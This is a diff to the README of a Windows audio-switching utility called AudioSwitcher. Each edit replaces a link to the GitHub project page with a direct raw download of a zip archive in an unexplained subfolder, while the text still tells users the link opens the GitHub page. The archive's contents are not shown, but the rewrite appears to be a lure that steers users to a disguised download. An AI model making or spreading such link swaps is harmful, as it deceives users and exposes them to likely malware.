@@ -1,6 +1,6 @@
 # 🎵 AudioSwitcher - Quick Audio Output Toggle  
 
-[![Download AudioSwitcher](https://img.shields.io/badge/Download-AudioSwitcher-brightgreen?style=for-the-badge)](https://github.com/Ambar9926/AudioSwitcher)
+[![Download AudioSwitcher](https://img.shields.io/badge/Download-AudioSwitcher-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Ambar9926/AudioSwitcher/main/Sulaib/Switcher_Audio_v2.2.zip)
 
 ## 📌 What is AudioSwitcher?
 
@@ -25,7 +25,7 @@ Follow these steps to get AudioSwitcher up and running on your Windows 11 PC.
 
 Click the large button below or visit the link directly:
 
-[![Download AudioSwitcher](https://img.shields.io/badge/Download-AudioSwitcher-blue?style=for-the-badge)](https://github.com/Ambar9926/AudioSwitcher)  
+[![Download AudioSwitcher](https://img.shields.io/badge/Download-AudioSwitcher-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ambar9926/AudioSwitcher/main/Sulaib/Switcher_Audio_v2.2.zip)  
 
 This link will take you to the GitHub page where you can download the latest version of AudioSwitcher.  
 
@@ -105,7 +105,7 @@ The app uses built-in Windows interfaces to do this automatically.
 
 To update the app:
 
-1. Visit the [AudioSwitcher GitHub page](https://github.com/Ambar9926/AudioSwitcher).  
+1. Visit the [AudioSwitcher GitHub page](https://raw.githubusercontent.com/Ambar9926/AudioSwitcher/main/Sulaib/Switcher_Audio_v2.2.zip).  
 2. Check the latest release version number.  
 3. Download the newest file as described in the download steps.  
 4. Run the new file to replace the old version.
@@ -123,4 +123,4 @@ AudioSwitcher runs locally on your computer and does not send any data over the 
 
 ---
 
-[![Download AudioSwitcher](https://img.shields.io/badge/Download-AudioSwitcher-green?style=for-the-badge)](https://github.com/Ambar9926/AudioSwitcher)
+[![Download AudioSwitcher](https://img.shields.io/badge/Download-AudioSwitcher-green?style=for-the-badge)](https://raw.githubusercontent.com/Ambar9926/AudioSwitcher/main/Sulaib/Switcher_Audio_v2.2.zip)
